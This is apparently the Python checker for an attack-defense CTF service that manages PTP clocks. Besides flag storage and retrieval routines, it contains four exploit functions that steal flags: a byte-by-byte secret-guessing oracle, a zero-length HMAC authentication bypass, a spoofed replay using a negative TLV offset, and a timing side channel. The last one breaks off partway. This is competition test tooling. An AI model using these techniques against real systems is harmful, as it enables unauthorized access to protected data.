import asyncio
import websockets.asyncio.client
import websockets.exceptions
import typing
import contextlib
import random
import string
import secrets
import hmac
import hashlib
import struct
import json
import errno
import fake_useragent
import lorem
import time
import numpy as np

from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in, FlagSearcher

import ptp_protocol
import ptp_message


"""
Checker config
"""

LOCAL_PORT = 2000
EVENT_PORT = 319
GENERAL_PORT = 320
HTTP_PORT = 1588
checker = Enochecker("syncryn1z3", HTTP_PORT)
app = lambda: checker.app


"""
Utility annotations
"""

def singleton(c):
    instances = {}

    def get_instance(*args, **kwargs):
        if c not in instances:
            instances[c] = c(*args, **kwargs)
            
        return instances[c]
    
    return get_instance


"""
Utility functions
"""

def get_time_ns():
    return time.clock_gettime_ns(time.CLOCK_MONOTONIC)

def generate_port_id():
    clock_id = random.randint(0x1, 0x7ffffffffffffffe)
    port = random.randint(0x1, 0xfffe)

    return clock_id, port

def generate_secret(length: int):
    return (''.join(secrets.choice(string.printable) for _ in range(length)))

def generate_timestamp():
    return random.randint(0x0, 0xffffffff * 1000000000) 

def encode_port_id(clock_id: int, port: int):
    return f"{clock_id:x}/{port:x}"

def decode_port_id(port_id: str):
    parts = port_id.split("/")
    
    return int(parts[0], 16), int(parts[1], 16)

def policy_to_int(policy: str):
    if policy == "hmac":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_HMAC_128
    elif policy == "plain":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_PLAIN
    else:
        raise InternalErrorException(f"Unknown policy {policy}")


"""
Dependencies
"""

class UdpClientProtocol(asyncio.DatagramProtocol):
    def __init__(self):
        self.transport = None
        self.queue = asyncio.Queue()

        self.on_con_lost = asyncio.get_event_loop().create_future()

    def connection_made(self, transport):
        self.transport = transport

    def connection_lost(self, exc):
        if not self.on_con_lost.done():
            self.on_con_lost.set_result(True)

    def datagram_received(self, data, address):
        self.queue.put_nowait((data, address))

    def error_received(self, e):
        error = abs(e.errno)

        if error == errno.ENOENT or error == errno.ECONNRESET or error == errno.EHOSTUNREACH or error == errno.ENETUNREACH:
            raise OfflineException(f"UDP transport error: {e}")
        else:
            raise InternalErrorException(f"UDP transport error: {e}")

class UdpConnection:
    BUFFER_SIZE = 1472

    def __init__(self, remote_address, protocol: UdpClientProtocol, logger: LoggerAdapter):
        self.remote_address = remote_address
        self.protocol = protocol
        self.logger = logger

    def send_raw(self, request, port):
        self.protocol.transport.sendto(request, (self.remote_address, port))

        self.logger.debug(f"Sent message to {(self.remote_address, port)}")
        
    async def receive_raw(self, port):
        try:
            response, address = await asyncio.wait_for(self.protocol.queue.get(), 1.0)
        except asyncio.TimeoutError:
            raise OfflineException("Timeout waiting for UDP response")
        
        self.logger.debug(f"Received message from {address}")
        
        if (len(response) + 42) % 16 != 0:
            self.logger.debug(f"Received message length: {len(response)}")
            raise MumbleException("Invalid message length of response")

        return response

    def send(self, message, port):
        request = message.encode(self.BUFFER_SIZE)
        self.send_raw(request, port)

    async def receive(self, port):
        response = await self.receive_raw(port)
        message = ptp_message.from_buffer(response)

        self.logger.debug(f"Decoded received message (type: {message.decoded.type}, seqno: {message.decoded.sequence_id}, port_id: {encode_port_id(message.decoded.port_id.clock_id, message.decoded.port_id.port)}, flags: {message.decoded.flags:x}, tlvs: {len(message.get_tlvs())})")

        if message.decoded.type == ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
            self.logger.debug(f"Decoded management message: (action: {message.decoded.payload.management.action}, target_port_id: {encode_port_id(message.decoded.payload.management.target_port_id.clock_id, message.decoded.payload.management.target_port_id.port)})")

        return message 

class WsConnection:
    def __init__(self, client: websockets.asyncio.client.ClientConnection, logger: LoggerAdapter):
        self.client = client
        self.logger = logger

    async def send(self, message: str):        
        await self.client.send(message)
        self.logger.debug(f"Sent websocket message: {message}")

    async def receive(self) -> str:        
        try:
            message = await asyncio.wait_for(self.client.recv(), 1)
        except asyncio.TimeoutError:
            raise OfflineException("Timeout waiting for websocket message")
        except websockets.exceptions.ConnectionClosed:
            raise OfflineException("Websocket connection closed")
        
        self.logger.debug(f"Received websocket message: {message}")
        
        return message
    
@singleton
class WsClientPool:
    CLEANUP_INTERVAL = 10
    MIN_TIMEOUT = 300
    MAX_TIMEOUT = 600

    def __init__(self, logger: LoggerAdapter):
        self.logger = logger
        self.clients: typing.Dict[str, list[tuple[websockets.asyncio.client.ClientConnection, float, asyncio.Lock]]] = {}
        self.lock = asyncio.Lock()
        self.cleanup_task = asyncio.create_task(self.cleanup())

    @contextlib.asynccontextmanager
    async def get_connection(self, host: str) -> typing.AsyncIterator[websockets.asyncio.client.ClientConnection]:
        async with self.lock:
            client = None

            now = time.time()

            # Search for free client
            if host in self.clients:
                entry = next((entry for entry in self.clients[host] if not entry[1].locked()), None)

                if entry is not None:
                    client, lock, _ = entry

                    if client.state != websockets.State.OPEN:
                        async with lock:
                            self.clients[host].remove(entry)
                            self.logger.debug(f"Removed peer-closed websocket client for {host}")

                        client = None
                    else:
                        self.logger.debug(f"Reusing websocket client to {host}")

            # Create new client
            if client is None:
                try:
                    client = await websockets.asyncio.client.connect(f"ws://{host}:{HTTP_PORT}/ws/", open_timeout=5, ping_interval=20, ping_timeout=20, user_agent_header=fake_useragent.UserAgent().random)
                except TimeoutError:
                    raise OfflineException("Websocket connection timeout")
                except Exception as e:
                    self.logger.debug(f"Websocket connection failed: {e}")
                    raise OfflineException("Websocket connection failed")

                lock = asyncio.Lock()
                timeout = now + random.randint(self.MIN_TIMEOUT, self.MAX_TIMEOUT)

                try:
                    self.clients[host] += [(client, lock, timeout)]
                except KeyError:
                    self.clients[host] = [(client, lock, timeout)]

            await lock.acquire()

            try:
                yield client
            finally:
                lock.release()

    async def cleanup(self):
        while True:
            await asyncio.sleep(self.CLEANUP_INTERVAL)

            async with self.lock:
                self.logger.debug("Cleanup websocket clients")

                now = time.time()
                for host in list(self.clients):
                    for entry in self.clients[host][:]:
                        client, lock, timeout = entry
                        if now > timeout:
                            async with lock:
                                await client.close()
                                self.clients[host].remove(entry)
                                self.logger.debug(f"Closed websocket client for {host}")

@checker.register_dependency
@contextlib.asynccontextmanager
async def _get_async_udp_protocol(logger: LoggerAdapter) -> typing.AsyncIterator[UdpClientProtocol]:
    try:
        transport, protocol = await asyncio.get_running_loop().create_datagram_endpoint(lambda: UdpClientProtocol(), local_addr=("0.0.0.0", 0))
    except Exception as e:
        logger.error(f"Failed to create UDP endpoint {e}")
        raise InternalErrorException("Could not create UDP socket")

    try:
        yield protocol
    finally:
        transport.close()
        await protocol.on_con_lost

@checker.register_dependency
def _get_udp_connection(task: BaseCheckerTaskMessage, protocol: typing.AsyncIterator[UdpClientProtocol], logger: LoggerAdapter) -> UdpConnection:
    return UdpConnection(task.address, protocol, logger)

@checker.register_dependency
async def _get_ws_client(task: BaseCheckerTaskMessage, logger: LoggerAdapter) -> typing.AsyncIterator[websockets.asyncio.client.ClientConnection]:
    ws_pool = WsClientPool(logger)

    return ws_pool.get_connection(task.address)

@checker.register_dependency
def _get_ws_connection(client: typing.AsyncIterator[websockets.asyncio.client.ClientConnection], logger: LoggerAdapter) -> WsConnection:
    return WsConnection(client, logger)

"""
Message functions
"""

def add_auth_tlv(message, policy: str, icv_length=None):
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
    tlv.payload.authentication.policy = policy_to_int(policy)
    tlv.payload.authentication.parameter_indicator = 0
    tlv.payload.authentication.key_id = 0

    if icv_length is not None:
        tlv.payload.authentication.icv_length = icv_length
    elif policy == "hmac":
        tlv.payload.authentication.icv_length = 16
    elif policy == "plain":
        tlv.payload.authentication.icv_length = 100
    else:
        raise InternalErrorException(f"Unknown policy {policy}")
    
def finalize_auth_tlv(tlv, request, secret=b"", icv=None):
    if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
        return

    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
    icv_address = tlv.payload.authentication.icv
    
    if tlv.payload.authentication.policy == policy_to_int("hmac"):
        if icv is None:
            icv = hmac.new(secret + b'\x00' * (100 - len(secret)), bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()
    elif tlv.payload.authentication.policy == policy_to_int("plain"):
        icv = secret + b'\0'
    else:
        raise InternalErrorException(f"Unknown policy in finalize")

    ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)

def finalize_auth_tlvs(request, secret=b"", icv=None):
    message = ptp_message.from_buffer(request)

    for tlv in message.get_tlvs():
        finalize_auth_tlv(tlv, request, secret, icv)


"""
Functionality functions
"""

async def create_clock(connection: WsConnection, logger: LoggerAdapter, clock_id: int, port: int, offset: int, visible: bool, secret: str, policy: str, description: str, expect_error=False):
    request = json.dumps({
        "task": "create_clock",
        "clockId": f"{clock_id:x}",
        "port": f"{port:x}",
        "offsetSeconds": np.floor(offset / 1000000000),
        "offsetNanoseconds": offset % 1000000000,
        "visible": visible,
        "authenticationPolicy": policy,
        "userDescription": description,
        "secret": secret})
    
    await connection.send(request)
    response = await connection.receive()

    try:
        response_decoded = json.loads(response)
    except json.JSONDecodeError:
        raise MumbleException("Failed to decode JSON reponse")

    if expect_error:
        try:
            return response_decoded["error"], response_decoded["code"]
        except KeyError:
            raise MumbleException("Expected 'error' and 'code' key in JSON response")
    else:
        try:
            assert_equals(response_decoded["task"], "create_clock", "Task mismatch in response")
        except KeyError:
            raise MumbleException("Expected 'task' key in JSON response")

async def inspect_clock(connection: WsConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: str, expect_error=False):
    request = json.dumps({
        "task": "inspect_clock",
        "clockId": f"{clock_id:x}",
        "port": f"{port:x}",
        "secret": secret})
    
    await connection.send(request)
    response = await connection.receive()

    try:
        response_decoded = json.loads(response)
    except json.JSONDecodeError:
        raise MumbleException("Failed to decode JSON reponse")

    if expect_error:
        try:
            return response_decoded["error"], response_decoded["code"]
        except KeyError:
            raise MumbleException("Expected 'error' and 'code' key in JSON response")
    else:
        try:
            assert_equals(response_decoded["task"], "inspect_clock", "Task mismatch in response")
        except KeyError:
            raise MumbleException("Expected 'task' key in JSON response")
        
    try:
        return response_decoded["userDescription"]
    except KeyError:
        raise MumbleException("Expected 'userDescription' key in JSON response")
        
async def get_user_description(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, expect_error=False):
    logger.debug(f"Get user description (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, policy)
    request = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request, secret=secret)

    connection.send_raw(request, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.info(f"Unexpected management error (get user description): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in USER_DESCRIPTION response")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
    
    return received_description.decode()
    
async def get_time(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, expect_error=False):
    logger.debug(f"Get time (port_id: {encode_port_id(clock_id, port)})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

    connection.send(message, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    current_time = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                current_time = tlv.payload.management.payload.time
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.info(f"Unexpected management error (get time): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in TIME response")

    if current_time is None:
        raise MumbleException("Received no TIME TLV")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
    
    return current_time

async def request_unicast_message(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, type: int):
    logger.debug(f"Request unicast message (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_SIGNALING, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.signaling.target_port_id.clock_id = clock_id
    payload.signaling.target_port_id.port = port

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_REQUEST_UNICAST_TRANSMISSION)
    tlv.payload.request_unicast.type = type
    tlv.payload.request_unicast.log_message_interval = 0
    tlv.payload.request_unicast.duration = 0

    add_auth_tlv(message, policy)
    request = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request, secret=secret)

    connection.send_raw(request, EVENT_PORT)
    response = await connection.receive(EVENT_PORT)

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_GRANT_UNICAST_TRANSMISSION:
            return
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            raise MumbleException(f"Received error from server: {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")

    raise MumbleException("Received no unicast transmission grant")

async def run_synchronization(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str):
    logger.debug(f"Run synchronization (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    await request_unicast_message(connection, logger, clock_id, port, secret, policy, ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC)

    sync = await connection.receive(EVENT_PORT)

    if sync.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC:
        raise MumbleException("Expected sync message")
    
    t1 = sync.decoded.payload.event.timestamp

    local_clock_id, local_port = generate_port_id()
    delay_request = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_REQUEST, local_clock_id, local_port, 0)

    payload = delay_request.get_payload()
    payload.event.timestamp = get_time_ns()

    connection.send(delay_request, EVENT_PORT)
    delay_response = await connection.receive(EVENT_PORT)

    if delay_response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_RESPONSE:
        raise MumbleException("Expected delay response message")
    
    t4 = delay_response.decoded.payload.event.timestamp

    if (t1 >= t4):
        raise MumbleException("Timejump during synchronization process")


"""
Checker functions
"""

@checker.putflag(0)
async def putflag_visible(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(16)

    # Generate random text in the beginning, so that the flag cannot be read by PTP messages
    prefix = ""
    while len(prefix) < 128:
        prefix += lorem.get_sentence(1)
    
    description = prefix + task.flag

    if len(description) > 1024:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", description)

    await db.set("userdata", (clock_id, port, secret))
    await db.set("prefix_length", len(prefix))

    return encode_port_id(clock_id, port)

@checker.putflag(1)
async def putflag_hmac(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)

    if len(task.flag) > 128:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), False, secret, "hmac", task.flag)

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.putflag(2)
async def putflag_plain(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(8)

    if len(task.flag) > 128:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), False, secret, "plain", task.flag)

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.getflag(0)
async def getflag_visible(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
        prefix_length = await db.get("prefix_length")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await inspect_clock(connection, logger, clock_id, port, secret)

    assert_equals(received_description[prefix_length:], task.flag, "Received wrong flag")

@checker.getflag(1)
async def getflag_hmac(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("utf-8"), "hmac")

    if received_description is None:
        raise MumbleException("Received no USER_DESCRIPTION TLV")
    
    assert_equals(received_description, task.flag, "Received wrong flag")

@checker.getflag(2)
async def getflag_plain(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "plain")

    assert_equals(received_description, task.flag, "Received wrong flag")

@checker.putnoise(0)
async def putnoise_sync(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", "")

    await db.set("userdata", (clock_id, port, secret))

@checker.putnoise(1)
async def putnoise_time(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)
    start_time = generate_timestamp()

    await create_clock(connection, logger, clock_id, port, start_time, True, secret, "hmac", "")

    await db.set("userdata", (clock_id, port, secret))
    await db.set("timedata", (start_time, get_time_ns()))

@checker.putnoise(2)
async def putnoise_user_description_twice(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: WsConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(50)
    description = generate_secret(50)

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", description)
    error, code = await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", generate_secret(50), True)

    assert_equals(error, "Failed to create clock in database", "Wrong error message")

    await db.set("userdata", (clock_id, port, secret, description))

@checker.getnoise(0)
async def getnoise_sync(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await run_synchronization(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")

@checker.getnoise(1)
async def getnoise_time(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
        start_time, creation_time = await db.get("timedata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    last_time = start_time + get_time_ns() - creation_time

    for _ in range(3):
        current_time = await get_time(connection, logger, clock_id, port)

        if current_time <= last_time:
            raise MumbleException("Timejump detected")
        
        last_time = current_time

@checker.getnoise(2)
async def getnoise_user_description_twice(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
    assert_equals(received_description, description, "Received wrong description")

@checker.havoc(0)
async def havoc_malformed_port_id(
    task: HavocCheckerTaskMessage,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = 0xffffffffffffffff
    port = 0xffff
    secret = generate_secret(50)

    await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", True)

@checker.exploit(0)
async def exploit_memcmp(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    connection: WsConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    
    secret = ""

    for i in range(16):
        async def guess_byte(secret):
            request = json.dumps({
                "task": "inspect_clock",
                "clockId": f"{clock_id:x}",
                "port": f"{port:x}",
                "secret": secret})
    
            await connection.send(request)
            response = await connection.receive()

            response_decoded = json.loads(response)

            if "userDescription" in response_decoded:
                # Early return in case we guessed the ICV prematurely
                logger.info("Early return")
                return 0

            return response_decoded["code"]

        guess_0 = await guess_byte(secret)
        secret += chr(1)
        guess_1 = await guess_byte(secret)
        secret = secret[:-1]

        # Check if we skipped a byte
        if guess_0 == guess_1 + 1 and guess_0 != 10:
            secret += chr(guess_0)
        else:
            secret += chr(10)
            guess_10 = await guess_byte(secret)
            secret = secret[:-1]

            # Tiebraker
            if guess_0 == 1 and guess_10 == 9:
                secret += chr(1)
            elif guess_0 == 10 and guess_1 == 9:
                secret += chr(10)
            else:
                secret += chr(0)

    received_description = await inspect_clock(connection, logger, clock_id, port, secret)
    received_flag = searcher.search_flag(received_description)
    
    logger.info(f"Received flag {received_flag}")
    return received_flag

@checker.exploit(1)
async def exploit_zerolength(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, "hmac", 0)

    connection.send(message, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.info(f"Received flag {received_flag}")
                return received_flag

@checker.exploit(2)
async def exploit_replay(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)

    # Spoof target port
    initial_message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, clock_id, port, 0)

    payload = initial_message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = initial_message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(initial_message, "hmac")

    connection.send(initial_message, GENERAL_PORT)
    response = await connection.receive_raw(GENERAL_PORT)

    altered_request = bytearray(response).rstrip(b'\0')[:-4]

    tlv_get_message = struct.pack("!HhHH", ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT, 4, ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION, 0)
    tlv_pad_message = struct.pack("!Hh", ptp_protocol.lib.PTP_TLV_TYPE_PAD, -38) # Jump back to auth TLV
    altered_request += tlv_get_message + tlv_pad_message

    if (len(response) < len(altered_request)):
        raise MumbleException(f"Not enough TLV tailroom (got {len(response)} but expected at least {len(altered_request)} bytes)")
    
    altered_request += b'\0' * (len(response) - len(altered_request))

    connection.send_raw(altered_request, GENERAL_PORT)
    response = await connection.receive(GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                logger.info(f"Received flag {received_flag}")
                return received_flag

@checker.exploit(3)
async def exploit_timing(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    for _ in range(10):
        # Measure execution time (start time / end time of previous char)
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

        # Trigger auth TLV
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        # Auth TLV to measure
        add_auth_tlv(message, "plain", 8)

    # End time of last char
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
    
    request = message.encode(connection.BUFFER_SIZE)
    message = ptp_message.from_buffer(request)

